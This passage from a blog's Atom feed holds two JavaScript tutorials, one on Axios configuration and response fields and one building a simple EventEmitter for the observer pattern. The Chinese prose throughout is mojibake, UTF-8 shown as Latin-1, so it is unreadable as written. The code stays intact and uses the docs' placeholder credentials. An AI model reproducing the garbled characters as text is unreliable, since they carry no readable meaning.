    <content type="html"><![CDATA[<p>Axiosæ˜¯è¿‘å¹´æ¥å¤‡å—æ¨å´‡çš„ä¸€ä¸ªç½‘ç»œè¯·æ±‚åº“ï¼Œå®ƒä»¥åŸºäºPromiseçš„æ–¹å¼å°è£…äº†æµè§ˆå™¨çš„XMLHttpRequestå’ŒæœåŠ¡å™¨ç«¯node httpè¯·æ±‚ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥ç”¨es6æ¨èçš„å¼‚æ­¥æ–¹å¼å¤„ç†ç½‘ç»œè¯·æ±‚ã€‚<br><a id="more"></a></p><h3 id="ä¸ºä»€ä¹ˆç”¨Axios"><a href="#ä¸ºä»€ä¹ˆç”¨Axios" class="headerlink" title="ä¸ºä»€ä¹ˆç”¨Axios"></a>ä¸ºä»€ä¹ˆç”¨Axios</h3><blockquote><p>å®˜æ–¹æ˜¯è¿™æ ·ä»‹ç»çš„ï¼š</p><ul><li>ä»æµè§ˆå™¨åˆ›å»ºXMLHttpRequest</li><li>ä»node.jsåˆ›å»ºhttpè¯·æ±‚</li><li>æ”¯æŒPromise API</li><li>è½¬æ¢è¯·æ±‚ä¸å“åº”æ•°æ®</li><li>å–æ¶ˆè¯·æ±‚</li><li>è‡ªåŠ¨è½¬æ¢JSONæ•°æ®</li><li>æ”¯æŒå®¢æˆ·ç«¯XSRFæ”»å‡»é˜²æŠ¤</li></ul></blockquote><p>æ‰©å±•äº†è¯¸å¤šåŠŸèƒ½ä¹‹å <code>axios.min.js</code> æ–‡ä»¶æœ€ç»ˆæ‰“åŒ…å‡ºæ¥å¤§å°ä»…æœ‰ <code>13kb</code>ã€‚</p><h3 id="é…ç½®è¯´æ˜"><a href="#é…ç½®è¯´æ˜" class="headerlink" title="é…ç½®è¯´æ˜"></a>é…ç½®è¯´æ˜</h3><p>å®˜æ–¹ç»™å‡ºäº†ä¸€ä»½è¯¦å°½çš„é…ç½®è¯´æ˜ï¼Œä¾›ä½¿ç”¨è€…è‡ªå®šä¹‰è‡ªå·±çš„ä½¿ç”¨æ–¹å¼ã€‚è¯¦æƒ…å¯ä»¥ç‚¹å‡»<a href="https://github.com/axios/axios">è¿™é‡Œ</a>ã€‚</p><h4 id="å…¨å±€é»˜è®¤é…ç½®"><a href="#å…¨å±€é»˜è®¤é…ç½®" class="headerlink" title="å…¨å±€é»˜è®¤é…ç½®"></a>å…¨å±€é»˜è®¤é…ç½®</h4><p><code>axios</code> ç»™å‡ºäº†3ä¸ªå…¨å±€çš„é…ç½®ä¿¡æ¯ï¼Œå¦‚ä¸‹ï¼š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">axios.defaults.baseURL = <span class="string">'https://api.example.com'</span>;</span><br><span class="line">axios.defaults.headers.common[<span class="string">'Authorization'</span>] = AUTH_TOKEN;</span><br><span class="line">axios.defaults.headers.post[<span class="string">'Content-Type'</span>] = <span class="string">'application/x-www-form-urlencoded'</span>;</span><br></pre></td></tr></table></figure></p><p><strong>baseURL</strong><br>ä»£è¡¨è¯·æ±‚çš„åœ°å€ï¼Œç±»ä¼¼äº <code>host</code>ã€‚æ¯”å¦‚ï¼š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> baseUrl = <span class="string">'https://api.github.com'</span></span><br><span class="line">axios.defaults.baseURL = baseUrl;</span><br><span class="line">axios.get(<span class="string">'/user'</span>)</span><br><span class="line">    .then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(res)</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="comment">// ------------ ä¸ä¸Šé¢çš„å†™æ³•ä½œç”¨ç›¸åŒ --------------//</span></span><br><span class="line">axios.get(<span class="string">'https://api.github.com/user'</span>)</span><br><span class="line">    .then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(res)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></p><p>é€šè¿‡é…ç½® <code>baseUrl</code> å¯ä»¥ç®€åŒ–è¯·æ±‚åœ°å€ã€‚</p><p><strong>Authorization</strong><br>æˆæƒä¿¡æ¯ï¼Œä¸€èˆ¬ç”¨äºç”¨æˆ·éªŒè¯ã€‚å¦‚æœæ²¡æœ‰è®¾ç½®ï¼Œåˆ™è¯·æ±‚æ˜¯ä¸ä¼šæºå¸¦ <code>Authorization</code> ä¿¡æ¯ã€‚</p><p><strong>Content-Type</strong><br>è¯·æ±‚é»˜è®¤çš„ <code>Content-Type</code> è®¾ç½®ä¸º <code>application/x-www-form-urlencoded</code>ï¼Œå¯ä»¥åœ¨å…¨å±€æ›´æ”¹ï¼Œä¹Ÿå¯ä»¥åœ¨ <code>æ‹¦æˆªå™¨</code> å’Œ <code>è¯·æ±‚/å“åº”é¢„å¤„ç†</code> ä¸­è®¾ç½®(åæ–‡ä¸­ä¼šç»†è¯´)ã€‚</p><h4 id="è¯·æ±‚é»˜è®¤é…ç½®"><a href="#è¯·æ±‚é»˜è®¤é…ç½®" class="headerlink" title="è¯·æ±‚é»˜è®¤é…ç½®"></a>è¯·æ±‚é»˜è®¤é…ç½®</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  url: <span class="string">'/user'</span>,</span><br><span class="line"></span><br><span class="line">  method: <span class="string">'get'</span>, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">  baseURL: <span class="string">'https://some-domain.com/api/'</span>,</span><br><span class="line"></span><br><span class="line">  transformRequest: [<span class="function"><span class="keyword">function</span> (<span class="params">data, headers</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">  &#125;],</span><br><span class="line"></span><br><span class="line">  transformResponse: [<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">  &#125;],</span><br><span class="line"></span><br><span class="line">  headers: &#123;<span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span>&#125;,</span><br><span class="line"></span><br><span class="line">  params: &#123;</span><br><span class="line">    ID: <span class="number">12345</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  paramsSerializer: <span class="function"><span class="keyword">function</span>(<span class="params">params</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Qs.stringify(params, &#123;<span class="attr">arrayFormat</span>: <span class="string">'brackets'</span>&#125;)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  data: &#123;</span><br><span class="line">    firstName: <span class="string">'Fred'</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  timeout: <span class="number">1000</span>,</span><br><span class="line"></span><br><span class="line">  withCredentials: <span class="literal">false</span>, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">  adapter: <span class="function"><span class="keyword">function</span> (<span class="params">config</span>) </span>&#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  auth: &#123;</span><br><span class="line">    username: <span class="string">'janedoe'</span>,</span><br><span class="line">    password: <span class="string">'s00pers3cret'</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  responseType: <span class="string">'json'</span>, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">  xsrfCookieName: <span class="string">'XSRF-TOKEN'</span>, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">  xsrfHeaderName: <span class="string">'X-XSRF-TOKEN'</span>, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">  onUploadProgress: <span class="function"><span class="keyword">function</span> (<span class="params">progressEvent</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  onDownloadProgress: <span class="function"><span class="keyword">function</span> (<span class="params">progressEvent</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  maxContentLength: <span class="number">2000</span>,</span><br><span class="line"></span><br><span class="line">  validateStatus: <span class="function"><span class="keyword">function</span> (<span class="params">status</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> status &gt;= <span class="number">200</span> &amp;&amp; status &lt; <span class="number">300</span>; <span class="comment">// default</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  maxRedirects: <span class="number">5</span>, <span class="comment">// default</span></span><br><span class="line"></span><br><span class="line">  httpAgent: <span class="keyword">new</span> http.Agent(&#123; <span class="attr">keepAlive</span>: <span class="literal">true</span> &#125;),</span><br><span class="line">  httpsAgent: <span class="keyword">new</span> https.Agent(&#123; <span class="attr">keepAlive</span>: <span class="literal">true</span> &#125;),</span><br><span class="line"></span><br><span class="line">  proxy: &#123;</span><br><span class="line">    host: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">    port: <span class="number">9000</span>,</span><br><span class="line">    auth: &#123;</span><br><span class="line">      username: <span class="string">'mikeymike'</span>,</span><br><span class="line">      password: <span class="string">'rapunz3l'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  cancelToken: <span class="keyword">new</span> CancelToken(<span class="function"><span class="keyword">function</span> (<span class="params">cancel</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€å¸¸ç”¨çš„ä¹Ÿå°±æ˜¯å‰é¢çš„ <code>10</code> ä¸ªé…ç½®ï¼Œè€Œä¸”æ„æ€éƒ½ç‰¹åˆ«å®¹æ˜“ç†è§£ã€‚<br>å…·ä½“çš„ç”¨æ³•å¯ä»¥å‚è€ƒ<a href="https://github.com/axios/axios">å®˜æ–¹è¯´æ˜</a>å’Œ<a href="https://github.com/axios/axios/tree/master/examples">examples</a>ã€‚</p><h4 id="è¿”å›ä½“"><a href="#è¿”å›ä½“" class="headerlink" title="è¿”å›ä½“"></a>è¿”å›ä½“</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  data: &#123;&#125;, <span class="comment">// æœåŠ¡ç«¯å¯¹äºè¯·æ±‚è¿”å›çš„å…·ä½“ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">  status: <span class="number">200</span>,<span class="comment">// æœåŠ¡ç«¯ http çš„çŠ¶æ€ç </span></span><br><span class="line"></span><br><span class="line">  statusText: <span class="string">'OK'</span>, <span class="comment">// æœåŠ¡ç«¯ http æ–‡æœ¬çš„å“åº”çŠ¶æ€</span></span><br><span class="line"></span><br><span class="line">  headers: &#123;&#125;, <span class="comment">// å“åº”å¤´éƒ¨</span></span><br><span class="line"></span><br><span class="line">  config: &#123;&#125;, <span class="comment">// axios è¯·æ±‚æ—¶çš„é…ç½®ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">  request: &#123;&#125; <span class="comment">// è¯·æ±‚çš„è¯¦ç»†ä¿¡æ¯(XMLHttpRequest)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºå†…å®¹å®åœ¨å¤ªå¤šï¼Œæœ¬æ–‡æš‚æ—¶å°±è®²è¿™ä¹ˆå¤šã€‚å…¶å®ƒå…³äº <code>axios</code> çš„æ–¹æ³•çš„ç”¨æ³•å’Œè¯´æ˜éƒ½ä¼šåœ¨åæ–‡ä¸­è®²è§£ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Axiosæ˜¯è¿‘å¹´æ¥å¤‡å—æ¨å´‡çš„ä¸€ä¸ªç½‘ç»œè¯·æ±‚åº“ï¼Œå®ƒä»¥åŸºäºPromiseçš„æ–¹å¼å°è£…äº†æµè§ˆå™¨çš„XMLHttpRequestå’ŒæœåŠ¡å™¨ç«¯node httpè¯·æ±‚ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥ç”¨es6æ¨èçš„å¼‚æ­¥æ–¹å¼å¤„ç†ç½‘ç»œè¯·æ±‚ã€‚&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>EventEmitter</title>
    <link href="https://github.com/TheNightElf/2017/12/12/EventEmitter/"/>
    <id>https://github.com/TheNightElf/2017/12/12/EventEmitter/</id>
    <published>2017-12-12T08:08:10.000Z</published>
    <updated>2017-12-13T03:12:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>è‡ªå·±ç¼–å†™ä¸€ä¸ªç®€å•çš„ <code>EventEmitter</code> å®ç° <code>è§‚å¯Ÿè€…æ¨¡å¼</code>ã€‚</p><a id="more"></a><h3 id="è§‚å¯Ÿè€…æ¨¡å¼"><a href="#è§‚å¯Ÿè€…æ¨¡å¼" class="headerlink" title="è§‚å¯Ÿè€…æ¨¡å¼"></a>è§‚å¯Ÿè€…æ¨¡å¼</h3><blockquote><p>è§‚å¯Ÿè€…æ¨¡å¼é¢å‘çš„éœ€æ±‚æ˜¯ï¼šAå¯¹è±¡ï¼ˆè§‚å¯Ÿè€…ï¼‰å¯¹Bå¯¹è±¡ï¼ˆè¢«è§‚å¯Ÿè€…ï¼‰çš„æŸç§å˜åŒ–é«˜åº¦æ•æ„Ÿï¼Œéœ€è¦åœ¨Bå˜åŒ–çš„ä¸€ç¬é—´åšå‡ºååº”ã€‚<br>ä¸¾ä¸ªä¾‹å­ï¼Œæ–°é—»é‡Œå–œé—»ä¹è§çš„è­¦å¯ŸæŠ“å°å·ï¼Œè­¦å¯Ÿéœ€è¦åœ¨å°å·ä¼¸æ‰‹ä½œæ¡ˆçš„æ—¶å€™å®æ–½æŠ“æ•ã€‚<br>åœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œè­¦å¯Ÿæ˜¯è§‚å¯Ÿè€…ã€å°å·æ˜¯è¢«è§‚å¯Ÿè€…ï¼Œè­¦å¯Ÿéœ€è¦æ—¶åˆ»ç›¯ç€å°å·çš„ä¸€ä¸¾ä¸€åŠ¨ï¼Œæ‰èƒ½ä¿è¯ä¸ä¼šé”™è¿‡ä»»ä½•ç¬é—´ã€‚<br>ç¨‹åºé‡Œçš„è§‚å¯Ÿè€…å’Œè¿™ç§çœŸæ­£çš„ã€è§‚å¯Ÿã€‘ç•¥æœ‰ä¸åŒï¼Œè§‚å¯Ÿè€…ä¸éœ€è¦æ—¶åˆ»ç›¯ç€è¢«è§‚å¯Ÿè€…(ä¾‹å¦‚Aä¸éœ€è¦æ¯éš”1mså°±æ£€æŸ¥ä¸€æ¬¡Bçš„çŠ¶æ€)ï¼›<br>äºŒæ˜¯é‡‡ç”¨æ³¨å†Œ(Register)æˆ–è€…æˆä¸ºè®¢é˜…(Subscribe)çš„æ–¹å¼å‘Šè¯‰è¢«è§‚å¯Ÿè€…ï¼š<br>æˆ‘éœ€è¦ä½ çš„æŸæŸçŠ¶æ€ï¼Œä½ è¦åœ¨å®ƒå˜åŒ–æ—¶é€šçŸ¥æˆ‘ã€‚é‡‡å–è¿™æ ·è¢«åŠ¨çš„è§‚å¯Ÿæ–¹å¼ï¼Œæ—¢çœå»äº†åå¤æ£€ç´¢çŠ¶æ€çš„èµ„æºæ¶ˆè€—ï¼Œä¹Ÿèƒ½å¤Ÿå¾—åˆ°æœ€é«˜çš„åé¦ˆé€Ÿåº¦ã€‚</p></blockquote><h3 id="è§‚å¯Ÿè€…æ¨¡å¼çš„ä¼˜ç¼ºç‚¹"><a href="#è§‚å¯Ÿè€…æ¨¡å¼çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="è§‚å¯Ÿè€…æ¨¡å¼çš„ä¼˜ç¼ºç‚¹"></a>è§‚å¯Ÿè€…æ¨¡å¼çš„ä¼˜ç¼ºç‚¹</h3><h4 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h4><ul><li>è§‚å¯Ÿè€…æ¨¡å¼åœ¨è¢«è§‚å¯Ÿè€…å’Œè§‚å¯Ÿè€…ä¹‹é—´å»ºç«‹ä¸€ä¸ªæŠ½è±¡çš„è€¦åˆã€‚è¢«è§‚å¯Ÿè€…è§’è‰²æ‰€çŸ¥é“çš„åªæ˜¯ä¸€ä¸ªå…·ä½“è§‚å¯Ÿè€…åˆ—è¡¨ï¼Œæ¯ä¸€ä¸ªå…·ä½“è§‚å¯Ÿè€…éƒ½ç¬¦åˆä¸€ä¸ªæŠ½è±¡è§‚å¯Ÿè€…çš„æ¥å£ã€‚è¢«è§‚å¯Ÿè€…å¹¶ä¸è®¤è¯†ä»»ä½•ä¸€ä¸ªå…·ä½“è§‚å¯Ÿè€…ï¼Œå®ƒåªçŸ¥é“å®ƒä»¬éƒ½æœ‰ä¸€ä¸ªå…±åŒçš„æ¥å£ã€‚</li><li>ç”±äºè¢«è§‚å¯Ÿè€…å’Œè§‚å¯Ÿè€…æ²¡æœ‰ç´§å¯†åœ°è€¦åˆåœ¨ä¸€èµ·ï¼Œå› æ­¤å®ƒä»¬å¯ä»¥å±äºä¸åŒçš„æŠ½è±¡åŒ–å±‚æ¬¡ã€‚å¦‚æœè¢«è§‚å¯Ÿè€…å’Œè§‚å¯Ÿè€…éƒ½è¢«æ‰”åˆ°ä¸€èµ·ï¼Œé‚£ä¹ˆè¿™ä¸ªå¯¹è±¡å¿…ç„¶è·¨è¶ŠæŠ½è±¡åŒ–å’Œå…·ä½“åŒ–å±‚æ¬¡ã€‚</li><li>è§‚å¯Ÿè€…æ¨¡å¼æ”¯æŒå¹¿æ’­é€šè®¯ã€‚è¢«è§‚å¯Ÿè€…ä¼šå‘æ‰€æœ‰çš„ç™»è®°è¿‡çš„è§‚å¯Ÿè€…å‘å‡ºé€šçŸ¥ã€‚</li></ul><h4 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h4><ul><li>å¦‚æœä¸€ä¸ªè¢«è§‚å¯Ÿè€…å¯¹è±¡æœ‰å¾ˆå¤šçš„ç›´æ¥å’Œé—´æ¥çš„è§‚å¯Ÿè€…çš„è¯ï¼Œå°†æ‰€æœ‰çš„è§‚å¯Ÿè€…éƒ½é€šçŸ¥åˆ°ä¼šèŠ±è´¹å¾ˆå¤šæ—¶é—´ã€‚</li><li>å¦‚æœåœ¨è¢«è§‚å¯Ÿè€…ä¹‹é—´æœ‰å¾ªç¯ä¾èµ–çš„è¯ï¼Œè¢«è§‚å¯Ÿè€…ä¼šè§¦å‘å®ƒä»¬ä¹‹é—´è¿›è¡Œå¾ªç¯è°ƒç”¨ï¼Œå¯¼è‡´ç³»ç»Ÿå´©æºƒã€‚</li><li>å¦‚æœå¯¹è§‚å¯Ÿè€…çš„é€šçŸ¥æ˜¯é€šè¿‡å¦å¤–çš„çº¿ç¨‹è¿›è¡Œå¼‚æ­¥æŠ•é€’çš„è¯ï¼Œç³»ç»Ÿå¿…é¡»ä¿è¯æŠ•é€’æ˜¯ä»¥è‡ªæ°çš„æ–¹å¼è¿›è¡Œçš„ã€‚</li><li>è™½ç„¶è§‚å¯Ÿè€…æ¨¡å¼å¯ä»¥éšæ—¶ä½¿è§‚å¯Ÿè€…çŸ¥é“æ‰€è§‚å¯Ÿçš„å¯¹è±¡å‘ç”Ÿäº†å˜åŒ–ï¼Œä½†æ˜¯è§‚å¯Ÿè€…æ¨¡å¼æ²¡æœ‰ç›¸åº”çš„æœºåˆ¶ä½¿è§‚å¯Ÿè€…çŸ¥é“æ‰€è§‚å¯Ÿçš„å¯¹è±¡æ˜¯æ€ä¹ˆå‘ç”Ÿå˜åŒ–çš„ã€‚</li></ul><h3 id="å®ç°æ–¹æ³•"><a href="#å®ç°æ–¹æ³•" class="headerlink" title="å®ç°æ–¹æ³•"></a>å®ç°æ–¹æ³•</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EventEmitter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.events = &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//ç»‘å®šäº‹ä»¶å‡½æ•°</span></span><br><span class="line">EventEmitter.prototype.on = <span class="function"><span class="keyword">function</span>(<span class="params">eventName, callback</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.events[eventName] = <span class="keyword">this</span>.events[eventName] || [];</span><br><span class="line">    <span class="keyword">this</span>.events[eventName].push(callback); <span class="comment">// 1</span></span><br><span class="line">&#125;;</span><br><span class="line">    <span class="comment">//è§¦å‘äº‹ä»¶å‡½æ•°</span></span><br><span class="line">EventEmitter.prototype.emit = <span class="function"><span class="keyword">function</span>(<span class="params">eventName, _</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> events = <span class="keyword">this</span>.events[eventName],</span><br><span class="line">    args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>, <span class="number">1</span>), <span class="comment">// 2</span></span><br><span class="line">    i, m;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!events) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, m = events.length; i &lt; m; i++) &#123;</span><br><span class="line">        events[i].apply(<span class="literal">null</span>, args); <span class="comment">// 3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">    <span class="comment">// åˆ é™¤äº‹ä»¶å‡½æ•°</span></span><br><span class="line">EventEmitter.prototype.off = <span class="function"><span class="keyword">function</span> (<span class="params">eventName</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">delete</span> <span class="keyword">this</span>.events[eventName]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šæœ‰3ä¸ªæ³¨æ„ç‚¹ï¼š<br>1.<code>EventEmitter</code> æ¥æ”¶äº‹ä»¶æ—¶æ˜¯ä»¥äº‹ä»¶åä½œä¸º <code>key</code> æ‰§è¡Œå‡½æ•°ä½œä¸º <code>value:array</code>ã€‚<br>2.ä½†ç”¨æˆ·è§¦å‘ <code>emit</code> æ—¶å¯ä»¥ä¼ é€’å¤šä¸ªå‚æ•°ï¼Œæ‰€ä»¥å°†é™¤ <code>äº‹ä»¶å(arg[0])</code> ä¹‹å¤–çš„å‚æ•°è§†ä¸ºä¼ å‚ï¼Œç¼“å­˜ä¾›ç¬¬ <code>3</code> æ­¥æ—¶ä½¿ç”¨ã€‚<br>3.éå†äº‹ä»¶çš„æ‰§è¡Œå‡½æ•° <code>value</code> å¹¶å°† <code>args</code> ä¼ é€’ç»™æ¯ä¸€ä¸ªäº‹ä»¶ã€‚</p><p>æ›´å¤šå…³äº <code>call</code> å’Œ <code>apply</code> çš„ä»‹ç»è¯·å‚è€ƒ<a href="https://developer.mozilla.org/en-US/" target="_blank" rel="noopener">è¿™é‡Œ</a></p><h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> Person = <span class="function"><span class="keyword">function</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype = <span class="keyword">new</span> EventEmitter()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Person()</span><br><span class="line"></span><br><span class="line">p.on(<span class="string">'hello'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello world'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p.emit(<span class="string">'hello'</span>) <span class="comment">// -&gt; hello world</span></span><br></pre></td></tr></table></figure><p>ä¼ é€’å‚æ•°æ—¶ï¼Œå¯ä»¥ç›´æ¥åœ¨ <code>on</code> æ‰§è¡Œå‡½æ•°ä¸­è·å– <code>emit</code> ä¸­ä¼ é€’çš„å‚æ•°ï¼›<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.on(<span class="string">'hello'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'hello'</span> + name)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p.emit(<span class="string">'hello'</span>, <span class="string">'Mark'</span>) <span class="comment">// -&gt; hello Mark</span></span><br></pre></td></tr></table></figure></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>ä»¥ä¸Šåªæ˜¯å¯¹è§‚å¯Ÿè€…æ¨¡å¼ä¸»ä½“çš„ä¸€ä¸ªç®€å•å®ç°ï¼Œè¿˜æœ‰å¾ˆå¤šå¯ä»¥æ‰©å±•çš„æ–¹æ³•å’Œä¼˜åŒ–çš„æ–¹æ¡ˆï¼Œè¿™é‡Œæˆ‘å°±ä¸å†ç»§ç»­å†™äº†ã€‚<br>å¦‚æœä½ æƒ³äº†è§£æ›´åŠ å®Œæ•´çš„å®ç°æ–¹å¼å¯ä»¥å‚è€ƒ <a href="https://github.com/asyncly/EventEmitter2">EventEmitter2</a>ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è‡ªå·±ç¼–å†™ä¸€ä¸ªç®€å•çš„ &lt;code&gt;EventEmitter&lt;/code&gt; å®ç° &lt;code&gt;è§‚å¯Ÿè€…æ¨¡å¼&lt;/code&gt;ã€‚&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
